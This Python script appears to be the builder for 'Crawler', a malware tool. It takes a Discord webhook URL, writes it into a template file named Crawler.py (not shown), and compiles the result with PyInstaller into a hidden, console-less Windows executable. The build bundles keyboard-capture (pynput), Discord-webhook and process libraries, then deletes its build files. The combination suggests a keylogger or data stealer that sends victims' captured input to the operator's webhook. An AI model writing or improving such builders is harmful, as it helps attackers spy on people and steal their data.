import subprocess
import os
import shutil
from pystyle import *
from time import sleep

Crawler = '''
 ▄████▄   ██▀███   ▄▄▄       █     █░ ██▓    ▓█████  ██▀███  
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▓█░ █ ░█░▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒█░ █ ░█ ▒██░    ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ░█░ █ ░█ ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒░░██▒██▓ ░██████▒░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▓░▒ ▒  ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ▒ ░ ░  ░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░          ░░   ░   ░   ▒     ░   ░    ░ ░      ░     ░░   ░ 
░ ░         ░           ░  ░    ░        ░  ░   ░  ░   ░     
░                                                            
'''

System.Size(140, 40)
System.Title("Crawler")
System.Clear()
Cursor.HideCursor()

def Start():
    System.Clear()
    print("\n"*2)
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(Crawler)))
    print("\n"*5)
    current_directory = os.getcwd()

    sleep(1.5)
    webhook = Write.Input("Enter your Discord Webhook : ", Colors.cyan_to_blue, interval=0.025)
    sleep(1.5)
    fname = Write.Input("\n\nEnter the file name : ", Colors.blue_to_cyan, interval=0.025)
    sleep(1.5)

    with open("Crawler.py", "r") as file:
        f = file.read()

    modified = f.replace("WebHook_URL", webhook)

    with open(fname + ".py", "w") as file2:
        file2.write(modified)

    output_folder = current_directory + "\\EXE" 
    input_script = os.path.join(current_directory, f"{fname}.py")

    subprocess.run([
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",
        "--collect-submodules=pynput",
        "--collect-submodules=discord-webhook",
        "--collect-submodules=psutil",
        "--distpath", output_folder,
        input_script
    ], shell=True)

    shutil.rmtree('build', ignore_errors=True)
    spec_file = fname + ".spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)
    if os.path.exists(input_script):
        os.remove(input_script)

Start()